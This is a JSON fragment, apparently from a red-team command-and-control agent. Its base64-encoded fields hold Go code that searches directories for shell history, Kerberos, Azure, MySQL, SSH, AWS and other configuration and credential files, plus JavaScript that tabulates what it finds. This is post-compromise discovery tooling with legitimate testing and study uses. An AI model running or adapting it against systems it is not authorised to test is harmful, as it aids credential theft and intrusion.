N0cmluZ3MuSGFzU3VmZml4KGZpbGUuTmFtZSgpLCAiX2hpc3RvcnkiKSAmJiBzdHJpbmdzLkhhc1ByZWZpeChmaWxlLk5hbWUoKSwgIi4iKSB7CgkJCQlhZGRGaWxlVG9EaXJlY3RvcnlUcmlhZ2VSZXN1bHQoZnVsbHBhdGgsIGZpbGUsIHJlc3VsdCwgJnJlc3VsdC5IaXN0b3J5RmlsZXMpCgkJCQkvLyBhZGRGaWxlVG9TbGljZSgmcmVzdWx0Lkhpc3RvcnlGaWxlcywgZnVsbHBhdGgsIGZpbGUpCgkJCQkvLyBBZGQgYWxsIHNoZWxsLXNjcmlwdCBmaWxlcy4KCQkJfSBlbHNlIGlmIHN0cmluZ3MuSGFzU3VmZml4KGZpbGUuTmFtZSgpLCAiLnNoIikgewoJCQkJYWRkRmlsZVRvRGlyZWN0b3J5VHJpYWdlUmVzdWx0KGZ1bGxwYXRoLCBmaWxlLCByZXN1bHQsICZyZXN1bHQuU2hlbGxTY3JpcHRGaWxlcykKCQkJCS8vIGFkZEZpbGVUb1NsaWNlKCZyZXN1bHQuU2hlbGxTY3JpcHRGaWxlcywgZnVsbHBhdGgsIGZpbGUpCgkJCQkvLyBBZGQgYWxsIHlhbWwgZmlsZXMuCgkJCX0gZWxzZSBpZiBzdHJpbmdzLkhhc1N1ZmZpeChmaWxlLk5hbWUoKSwgIi55bWwiKSB8fCBzdHJpbmdzLkhhc1N1ZmZpeChmaWxlLk5hbWUoKSwgIi55YW1sIikgewoJCQkJYWRkRmlsZVRvRGlyZWN0b3J5VHJpYWdlUmVzdWx0KGZ1bGxwYXRoLCBmaWxlLCByZXN1bHQsICZyZXN1bHQuWUFNTEZpbGVzKQoJCQkJLy8gYWRkRmlsZVRvU2xpY2UoJnJlc3VsdC5ZQU1MRmlsZXMsIGZ1bGxwYXRoLCBmaWxlKQoJCQkJLy8gQWRkIGFsbCBjb25maWd1cmF0aW9uIGZpbGVzLgoJCQl9IGVsc2UgaWYgc3RyaW5ncy5IYXNTdWZmaXgoZmlsZS5OYW1lKCksICIuY29uZiIpIHsKCQkJCWFkZEZpbGVUb0RpcmVjdG9yeVRyaWFnZVJlc3VsdChmdWxscGF0aCwgZmlsZSwgcmVzdWx0LCAmcmVzdWx0LkNvbmZGaWxlcykKCQkJCS8vIGFkZEZpbGVUb1NsaWNlKCZyZXN1bHQuQ29uZkZpbGVzLCBmdWxscGF0aCwgZmlsZSkKCQkJCS8vIEFueSAiaW50ZXJlc3RpbmciIGZpbGUgbmFtZXMuCgkJCX0gZWxzZSBpZiBhbnlTbGljZUluU3RyaW5nKGZpbGUuTmFtZSgpLCBpbnRlcmVzdGluZ05hbWVzKSB7CgkJCQlhZGRGaWxlVG9EaXJlY3RvcnlUcmlhZ2VSZXN1bHQoZnVsbHBhdGgsIGZpbGUsIHJlc3VsdCwgJnJlc3VsdC5JbnRlcmVzdGluZ0ZpbGVzKQoJCQkJLy8gYWRkRmlsZVRvU2xpY2UoJnJlc3VsdC5JbnRlcmVzdGluZ0ZpbGVzLCBmdWxscGF0aCwgZmlsZSkKCQkJCS8vIEFueSBrZXJiZXJvcyBmaWxlcy4KCQkJfSBlbHNlIGlmIHN0cmluZ3MuSGFzUHJlZml4KGZpbGUuTmFtZSgpLCAia3JiNSIpIHsKCQkJCWFkZEZpbGVUb0RpcmVjdG9yeVRyaWFnZVJlc3VsdChmdWxscGF0aCwgZmlsZSwgcmVzdWx0LCAmcmVzdWx0LktlcmJlcm9zRmlsZXMpCgkJCQkvLyBhZGRGaWxlVG9TbGljZSgmcmVzdWx0LktlcmJlcm9zRmlsZXMsIGZ1bGxwYXRoLCBmaWxlKQoJCQkJLy8gQW55IE15U1FMIGNvbmZpZ3VyYXRpb24gZmlsZXMuCgkJCX0gZWxzZSBpZiBmaWxlLk5hbWUoKSA9PSAiLm15LmNuZiIgfHwgZmlsZS5OYW1lKCkgPT0gIm15LmNuZiIgewoJCQkJYWRkRmlsZVRvRGlyZWN0b3J5VHJpYWdlUmVzdWx0KGZ1bGxwYXRoLCBmaWxlLCByZXN1bHQsICZyZXN1bHQuTXlTcWxDb25mRmlsZXMpCgkJCQkvLyBhZGRGaWxlVG9TbGljZSgmcmVzdWx0Lk15U3FsQ29uZkZpbGVzLCBmdWxscGF0aCwgZmlsZSkKCQkJCS8vIEFueSBhenVyZSBmaWxlcwoJCQl9IGVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhmdWxscGF0aCwgc3RyaW5nKG9zLlBhdGhTZXBhcmF0b3IpKyIuYXp1cmUiK3N0cmluZyhvcy5QYXRoU2VwYXJhdG9yKSkgewoJCQkJYWRkRmlsZVRvRGlyZWN0b3J5VHJpYWdlUmVzdWx0KGZ1bGxwYXRoLCBmaWxlLCByZXN1bHQsICZyZXN1bHQuQXp1cmVGaWxlcykKCQkJCS8vIGFkZEZpbGVUb1NsaWNlKCZyZXN1bHQuQXp1cmVGaWxlcywgZnVsbHBhdGgsIGZpbGUpCgkJCX0gZWxzZSBpZiBzdHJpbmdzLkhhc1N1ZmZpeChmaWxlLk5hbWUoKSwgIi5sb2ciKSB7CgkJCQlhZGRGaWxlVG9EaXJlY3RvcnlUcmlhZ2VSZXN1bHQoZnVsbHBhdGgsIGZpbGUsIHJlc3VsdCwgJnJlc3VsdC5Mb2dGaWxlcykKCQkJCS8vIGFkZEZpbGVUb1NsaWNlKCZyZXN1bHQuTG9nRmlsZXMsIGZ1bGxwYXRoLCBmaWxlKQoJCQl9IGVsc2UgaWYgc3RyaW5ncy5IYXNTdWZmaXgoZmlsZS5OYW1lKCksICIuY3N2IikgfHwgc3RyaW5ncy5IYXNTdWZmaXgoZmlsZS5OYW1lKCksICIudHN2IikgewoJCQkJYWRkRmlsZVRvRGlyZWN0b3J5VHJpYWdlUmVzdWx0KGZ1bGxwYXRoLCBmaWxlLCByZXN1bHQsICZyZXN1bHQuQ1NWRmlsZXMpCgkJCQkvLyBhZGRGaWxlVG9TbGljZSgmcmVzdWx0LkNTVkZpbGVzLCBmdWxscGF0aCwgZmlsZSkKCQkJfSBlbHNlIGlmIHN0cmluZ3MuSGFzU3VmZml4KGZpbGUuTmFtZSgpLCAiLmRiIikgewoJCQkJYWRkRmlsZVRvRGlyZWN0b3J5VHJpYWdlUmVzdWx0KGZ1bGxwYXRoLCBmaWxlLCByZXN1bHQsICZyZXN1bHQuRGF0YWJhc2VGaWxlcykKCQkJCS8vIGFkZEZpbGVUb1NsaWNlKCZyZXN1bHQuRGF0YWJhc2VGaWxlcywgcGF0aCwgaW5mbykKCQkJfSBlbHNlIGlmIHN0cmluZ3MuSGFzU3VmZml4KGZpbGUuTmFtZSgpLCAiLmRvYyIpIHx8IHN0cmluZ3MuSGFzU3VmZml4KGZpbGUuTmFtZSgpLCAiLmRvY3giKSB7CgkJCQlhZGRGaWxlVG9EaXJlY3RvcnlUcmlhZ2VSZXN1bHQoZnVsbHBhdGgsIGZpbGUsIHJlc3VsdCwgJnJlc3VsdC5NU1dvcmRGaWxlcykKCQkJCS8vIGFkZEZpbGVUb1NsaWNlKCZyZXN1bHQuRGF0YWJhc2VGaWxlcywgcGF0aCwgaW5mbykKCQkJfSBlbHNlIGlmIHN0cmluZ3MuSGFzU3VmZml4KGZpbGUuTmFtZSgpLCAiLnhscyIpIHx8IHN0cmluZ3MuSGFzU3VmZml4KGZpbGUuTmFtZSgpLCAiLnhsc3giKSB7CgkJCQlhZGRGaWxlVG9EaXJlY3RvcnlUcmlhZ2VSZXN1bHQoZnVsbHBhdGgsIGZpbGUsIHJlc3VsdCwgJnJlc3VsdC5NU0V4Y2VsRmlsZXMpCgkJCQkvLyBhZGRGaWxlVG9TbGljZSgmcmVzdWx0LkRhdGFiYXNlRmlsZXMsIHBhdGgsIGluZm8pCgkJCX0gZWxzZSBpZiBzdHJpbmdzLkhhc1N1ZmZpeChmaWxlLk5hbWUoKSwgIi5wcHQiKSB8fCBzdHJpbmdzLkhhc1N1ZmZpeChmaWxlLk5hbWUoKSwgIi5wcHR4IikgewoJCQkJYWRkRmlsZVRvRGlyZWN0b3J5VHJpYWdlUmVzdWx0KGZ1bGxwYXRoLCBmaWxlLCByZXN1bHQsICZyZXN1bHQuTVNQb3dlclBvaW50RmlsZXMpCgkJCQkvLyBhZGRGaWxlVG9TbGljZSgmcmVzdWx0LkRhdGFiYXNlRmlsZXMsIHBhdGgsIGluZm8pCgkJCX0gZWxzZSBpZiBzdHJpbmdzLkhhc1N1ZmZpeChmaWxlLk5hbWUoKSwgIi50eHQiKSB7CgkJCQlhZGRGaWxlVG9EaXJlY3RvcnlUcmlhZ2VSZXN1bHQoZnVsbHBhdGgsIGZpbGUsIHJlc3VsdCwgJnJlc3VsdC5UZXh0RmlsZXMpCgkJCQkvLyBhZGRGaWxlVG9TbGljZSgmcmVzdWx0LkRhdGFiYXNlRmlsZXMsIHBhdGgsIGluZm8pCgkJCX0gZWxzZSBpZiBzdHJpbmdzLkhhc1N1ZmZpeChmaWxlLk5hbWUoKSwgIi5wZGYiKSB7CgkJCQlhZGRGaWxlVG9EaXJlY3RvcnlUcmlhZ2VSZXN1bHQoZnVsbHBhdGgsIGZpbGUsIHJlc3VsdCwgJnJlc3VsdC5QREZzKQoJCQkJLy8gYWRkRmlsZVRvU2xpY2UoJnJlc3VsdC5EYXRhYmFzZUZpbGVzLCBwYXRoLCBpbmZvKQoJCQl9CgkJfQoJfQoKCXdnLldhaXQoKQoJcmV0dXJuIG5pbAp9Cg=="
            }
          ],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2Upew0KCWNvbnN0IGNhcGl0YWxpemUgPSAocykgPT4gew0KICAgIGlmICh0eXBlb2YgcyAhPT0gJ3N0cmluZycpIHJldHVybiAnJw0KICAgIHJldHVybiBzLmNoYXJBdCgwKS50b1VwcGVyQ2FzZSgpICsgcy5zbGljZSgxKQ0KfTsNCiAgICB2YXIgdG90YWxfb3V0cHV0ID0gIiI7DQogICAgdmFyIHRvdGFsX3Jlc3VsdHMgPSAiIjsNCiAgZm9yKHZhciBpID0gMDsgaSA8IHJlc3BvbnNlLmxlbmd0aDsgaSsrKXsNCiAgICB0cnl7DQogICAgCQl0b3RhbF9yZXN1bHRzICs9IHJlc3BvbnNlW2ldWyJyZXNwb25zZSJdOw0KICAgIH1jYXRjaChlcnJvcil7DQogICAgICAgIHJldHVybiByZXNwb25zZTsNCiAgICB9DQogIH0NCiAgdmFyIGRhdGEgPSBKU09OLnBhcnNlKHRvdGFsX3Jlc3VsdHMpOw0KICAgdmFyIGtleXMgPSBbImF6dXJlX2ZpbGVzIiwgImF3c19maWxlcyIsICJzc2hfZmlsZXMiLCAia2VyYmVyb3NfdGlja2V0cyIsICJoaXN0b3J5X2ZpbGVzIiwgImxvZ19maWxlcyIsICJzaGVsbHNjcmlwdF9maWxlcyIsICJ5YW1sX2ZpbGVzIiwgImNvbmZfZmlsZXMiLCAiY3N2X2ZpbGVzIiwgImRiX2ZpbGVzIiwgIm15c3FsX2NvbmZzIiwgImludGVyZXN0aW5nX2ZpbGVzIl07DQogICBmb3IgKGkgPSAwOyBpIDwga2V5cy5sZW5ndGg7IGkrKykgew0KICAgICAgIGlmIChkYXRhW2tleXNbaV1dICE9IG51bGwpIHsNCiAgICAgICAgICAgdmFyIG91dHB1dCA9ICIiOw0KICAgICAgICAgICB2YXIgcm93cyA9IFtdDQogICAgICAgICAgICB2YXIgY2VsbF9zdHlsZSA9IHsiaGlkZGVuIjogInRleHQtYWxpZ246Y2VudGVyIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0eXBlIjoidGV4dC1hbGlnbjpjZW50ZXIifTsNCiAgICAgICAgICAgdmFyIHRpdGxlX3BhcnRzID0ga2V5c1tpXS5zcGxpdCgiXyIpOw0KICAgICAgICAgICB0aXRsZV9wYXJ0c1swXSA9IGNhcGl0YWxpemUodGl0bGVfcGFydHNbMF0pOw0KICAgICAgICAgICB0aXRsZV9wYXJ0c1sxXSA9IGNhcGl0YWxpemUodGl0bGVfcGFydHNbMV0pOw0KICAgICAgICAgICB0aXRsZSA9IHRpdGxlX3BhcnRzLmpvaW4oIiAiKTsNCiAgICAgICAgICAgaWYgKGkgPCA0KSB7DQogICAgICAgICAgICAgICAgb3V0cHV0ICs9ICc8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciBzaGFkb3ciIHN0eWxlPSJ0b3A6IDBweDsgYmFja2dyb3VuZC1jb2xvcjogI0RDMTQzQzsgY29sb3I6IHdoaXRlOyI+JyArIHRpdGxlICsgJzwvZGl2Pic7DQogICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgb3V0cHV0ICs9ICc8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciBzaGFkb3ciIHN0eWxlPSJ0b3A6IDBweDsgYmFja2dyb3VuZC1jb2xvcjogI2NjNTUwMDsiPicgKyB0aXRsZSArICc8L2Rpdj4nOw0KICAgICAgICAgICB9DQogICAgICAgICAgICBkYXRhW2tleXNbaV1dLmZvckVhY2goZnVuY3Rpb24ocil7DQogICAgICAgICAgICB2YXIgcm93X3N0eWxlID0gIiI7DQogICAgICAgICAgICBpZihyWydpc19kaXInXSl7cm93X3N0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjMDA4MDgwOyJ9DQogICAgICAgICAgICByb3dzLnB1c2goeyJuYW1lIjogclsnbmFtZSddLA0KICAgICAgICAgICAgICAgICAgICAgICAgInBhdGgiOiByWyJwYXRoIl0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzaXplIjogclsnc2l6ZSddLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibW9kZSI6IHJbJ21vZGUnXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIm1vZGlmaWNhdGlvbl90aW1lIjogclsnbW9kaWZpY2F0aW9uX3RpbWUnXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJyb3ctc3R5bGUiOiByb3dfc3R5bGUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY2VsbC1zdHlsZSI6IHsiaGlkZGVuIjogInRleHQtYWxpZ246Y2VudGVyIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInR5cGUiOiJ0ZXh0LWFsaWduOmNlbnRlciJ9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICBvdXRwdXQgKz0gc3VwcG9ydF9zY3JpcHRzWydjcmVhdGVfdGFibGUnXShbeyJuYW1lIjoibmFtZSIsICJzaXplIjoiMWVtIn0seyJuYW1lIjoicGF0aCIsICJzaXplIjoiMWVtIn0sIHsibmFtZSI6InNpemUiLCAic2l6ZSI6IjFlbSJ9LHsibmFtZSI6Im1vZGUiLCJzaXplIjoiMWVtIn0gLHsibmFtZSI6ICJtb2RpZmljYXRpb25fdGltZSIsICJzaXplIjogIjFlbSJ9XSwgcm93cyk7DQogICAgICAgICAgICB0b3RhbF9vdXRwdXQgKz0gb3V0cHV0Ow0KICAgICAgICB9DQogICB9DQogICByZXR1cm4gdG90YWxfb3V0cHV0Ow0KfQ=="
        }
      ]
    }
  ]
}
